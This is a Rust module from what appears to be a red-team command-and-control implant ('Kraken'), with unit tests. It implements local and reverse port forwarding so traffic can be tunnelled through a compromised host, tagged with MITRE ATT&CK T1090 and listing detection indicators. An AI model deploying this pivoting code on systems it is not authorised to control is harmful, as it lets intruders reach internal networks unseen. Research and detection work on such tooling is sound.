//! Port forwarding — local and reverse port forwards
//!
//! ## MITRE ATT&CK
//! - T1090: Proxy
//! - T1090.001: Internal Proxy
//!
//! Provides:
//! - Local port forward: binds on implant, forwards to remote target
//! - Reverse port forward: binds on server, tunnels to implant-accessible target
//!
//! # Detection Indicators
//! - Unexpected listening ports on compromised host
//! - Sustained TCP tunnels between unrelated endpoints
//! - High-volume relay traffic from non-service processes

use common::KrakenError;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::{
    Arc, Mutex,
    atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering},
};
use std::thread;
use std::time::Duration;

/// Global port forward ID counter
static NEXT_ID: AtomicU32 = AtomicU32::new(1);

/// A single port forward entry
#[derive(Debug)]
pub struct PortForward {
    pub id: u32,
    pub bind_addr: SocketAddr,
    pub forward_host: String,
    pub forward_port: u16,
    pub reverse: bool,
    pub bytes_transferred: Arc<AtomicU64>,
    active: Arc<AtomicBool>,
}

/// Serialisable summary of a port forward (no Arc / AtomicU64 in public API)
#[derive(Debug, Clone)]
pub struct PortForwardInfo {
    pub id: u32,
    pub bind_addr: String,
    pub forward_host: String,
    pub forward_port: u16,
    pub reverse: bool,
    pub bytes_transferred: u64,
}

/// Manages local and reverse port forwards
pub struct PortForwardManager {
    forwards: Arc<Mutex<HashMap<u32, PortForward>>>,
}

impl PortForwardManager {
    pub fn new() -> Self {
        Self {
            forwards: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Start a local port forward.
    ///
    /// Binds `bind_host:bind_port` on the implant and forwards every accepted
    /// connection to `forward_host:forward_port`.
    pub fn start_local(
        &self,
        bind_host: &str,
        bind_port: u16,
        forward_host: &str,
        forward_port: u16,
    ) -> Result<u32, KrakenError> {
        let bind_addr: SocketAddr = format!("{}:{}", bind_host, bind_port)
            .parse()
            .map_err(|e| KrakenError::Module(format!("invalid bind address: {}", e)))?;

        let listener = TcpListener::bind(bind_addr)
            .map_err(|e| KrakenError::Module(format!("bind failed: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| KrakenError::Module(format!("set_nonblocking failed: {}", e)))?;

        let id = NEXT_ID.fetch_add(1, Ordering::SeqCst);
        let active = Arc::new(AtomicBool::new(true));
        let bytes = Arc::new(AtomicU64::new(0));

        let active_clone = active.clone();
        let bytes_clone = bytes.clone();
        let fwd_host = forward_host.to_string();

        thread::spawn(move || {
            while active_clone.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((client, _addr)) => {
                        let fh = fwd_host.clone();
                        let bc = bytes_clone.clone();
                        let ac = active_clone.clone();
                        thread::spawn(move || {
                            if let Ok(target) =
                                TcpStream::connect(format!("{}:{}", fh, forward_port))
                            {
                                relay_streams(client, target, bc, ac);
                            }
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(100));
                    }
                    Err(_) => break,
                }
            }
        });

        let entry = PortForward {
            id,
            bind_addr,
            forward_host: forward_host.to_string(),
            forward_port,
            reverse: false,
            bytes_transferred: bytes,
            active,
        };

        self.forwards.lock().unwrap().insert(id, entry);
        Ok(id)
    }

    /// Register a reverse port forward stub.
    ///
    /// In a full reverse-forward implementation the teamserver binds the
    /// external port and pushes tunnel requests to the implant via the C2
    /// channel; the implant then connects to the internal target and relays
    /// data.  This method records the intent and returns an ID so the caller
    /// can later stop or enumerate the forward.  Actual data relay is driven
    /// by the C2 message handler which calls [`relay_streams`] directly.
    pub fn start_reverse(
        &self,
        bind_host: &str,
        bind_port: u16,
        forward_host: &str,
        forward_port: u16,
    ) -> Result<u32, KrakenError> {
        let bind_addr: SocketAddr = format!("{}:{}", bind_host, bind_port)
            .parse()
            .unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap());

        let id = NEXT_ID.fetch_add(1, Ordering::SeqCst);
        let active = Arc::new(AtomicBool::new(true));
        let bytes = Arc::new(AtomicU64::new(0));

        let entry = PortForward {
            id,
            bind_addr,
            forward_host: forward_host.to_string(),
            forward_port,
            reverse: true,
            bytes_transferred: bytes,
            active,
        };

        self.forwards.lock().unwrap().insert(id, entry);
        Ok(id)
    }

    /// Stop a specific port forward by ID.
    pub fn stop(&self, id: u32) -> Result<(), KrakenError> {
        let mut forwards = self.forwards.lock().unwrap();
        if let Some(fwd) = forwards.remove(&id) {
            fwd.active.store(false, Ordering::SeqCst);
            Ok(())
        } else {
            Err(KrakenError::Module(format!(
                "port forward {} not found",
                id
            )))
        }
    }

    /// List all currently registered port forwards.
    pub fn list(&self) -> Vec<PortForwardInfo> {
        self.forwards
            .lock()
            .unwrap()
            .values()
            .map(|fwd| PortForwardInfo {
                id: fwd.id,
                bind_addr: fwd.bind_addr.to_string(),
                forward_host: fwd.forward_host.clone(),
                forward_port: fwd.forward_port,
                reverse: fwd.reverse,
                bytes_transferred: fwd.bytes_transferred.load(Ordering::SeqCst),
            })
            .collect()
    }

    /// Stop all port forwards.
    pub fn stop_all(&self) {
        let mut forwards = self.forwards.lock().unwrap();
        for fwd in forwards.drain().map(|(_, v)| v) {
            fwd.active.store(false, Ordering::SeqCst);
        }
    }
}

impl Default for PortForwardManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Relay data bidirectionally between two TCP streams until either side closes
/// or `active` is set to `false`.
///
/// Spawns two threads (one per direction) and waits for both to complete.
pub fn relay_streams(
    client: TcpStream,
    target: TcpStream,
    bytes: Arc<AtomicU64>,
    active: Arc<AtomicBool>,
) {
    let _ = client.set_read_timeout(Some(Duration::from_millis(100)));
    let _ = target.set_read_timeout(Some(Duration::from_millis(100)));

    // Clone ends for the second direction
    let mut client_w = client.try_clone().expect("clone client stream");
    let mut target_w = target.try_clone().expect("clone target stream");
    let mut client_r = client;
    let mut target_r = target;

    let bytes2 = bytes.clone();
    let active2 = active.clone();

    // client -> target
    let h1 = thread::spawn(move || {
        let mut buf = [0u8; 8192];
        while active.load(Ordering::SeqCst) {
            match client_r.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    bytes.fetch_add(n as u64, Ordering::SeqCst);
                    if target_w.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
                Err(_) => break,
            }
        }
    });

    // target -> client
    let h2 = thread::spawn(move || {
        let mut buf = [0u8; 8192];
        while active2.load(Ordering::SeqCst) {
            match target_r.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    bytes2.fetch_add(n as u64, Ordering::SeqCst);
                    if client_w.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
                Err(_) => break,
            }
        }
    });

    let _ = h1.join();
    let _ = h2.join();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_manager_new() {
        let mgr = PortForwardManager::new();
        assert!(mgr.list().is_empty());
    }

    #[test]
    fn test_manager_default() {
        let mgr = PortForwardManager::default();
        assert!(mgr.list().is_empty());
    }

    #[test]
    fn test_start_local_binds_port() {
        let mgr = PortForwardManager::new();
        // Port 0 lets the OS pick a free port
        let id = mgr
            .start_local("127.0.0.1", 0, "127.0.0.1", 9999)
            .expect("start_local should succeed");

        let list = mgr.list();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].id, id);
        assert!(!list[0].reverse);
        assert_eq!(list[0].forward_host, "127.0.0.1");
        assert_eq!(list[0].forward_port, 9999);
    }

    #[test]
    fn test_start_reverse_registers_entry() {
        let mgr = PortForwardManager::new();
        let id = mgr
            .start_reverse("0.0.0.0", 0, "10.0.0.1", 8080)
            .expect("start_reverse should succeed");

        let list = mgr.list();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].id, id);
        assert!(list[0].reverse);
        assert_eq!(list[0].forward_host, "10.0.0.1");
        assert_eq!(list[0].forward_port, 8080);
    }

    #[test]
    fn test_stop_removes_forward() {
        let mgr = PortForwardManager::new();
        let id = mgr
            .start_reverse("0.0.0.0", 0, "10.0.0.1", 8080)
            .unwrap();
        assert_eq!(mgr.list().len(), 1);

        mgr.stop(id).expect("stop should succeed");
        assert!(mgr.list().is_empty());
    }

    #[test]
    fn test_stop_unknown_id_returns_error() {
        let mgr = PortForwardManager::new();
        let result = mgr.stop(9999);
        assert!(result.is_err());
        if let Err(KrakenError::Module(msg)) = result {
            assert!(msg.contains("9999"));
        }
    }

    #[test]
    fn test_stop_all_clears_all_forwards() {
        let mgr = PortForwardManager::new();
        mgr.start_reverse("0.0.0.0", 0, "10.0.0.1", 80).unwrap();
        mgr.start_reverse("0.0.0.0", 0, "10.0.0.2", 443).unwrap();
        assert_eq!(mgr.list().len(), 2);

        mgr.stop_all();
        assert!(mgr.list().is_empty());
    }

    #[test]
    fn test_id_generation_is_unique() {
        let mgr = PortForwardManager::new();
        let id1 = mgr
            .start_reverse("0.0.0.0", 0, "10.0.0.1", 80)
            .unwrap();
        let id2 = mgr
            .start_reverse("0.0.0.0", 0, "10.0.0.2", 443)
            .unwrap();
        assert_ne!(id1, id2);
    }

    #[test]
    fn test_invalid_bind_address_returns_error() {
        let mgr = PortForwardManager::new();
        // Port is valid but hostname is not a valid IP/hostname for parsing
        let result = mgr.start_local("256.256.256.256", 8080, "127.0.0.1", 80);
        assert!(result.is_err());
    }

    #[test]
    fn test_bytes_transferred_starts_zero() {
        let mgr = PortForwardManager::new();
        mgr.start_reverse("0.0.0.0", 0, "10.0.0.1", 80).unwrap();
        let list = mgr.list();
        assert_eq!(list[0].bytes_transferred, 0);
    }
}
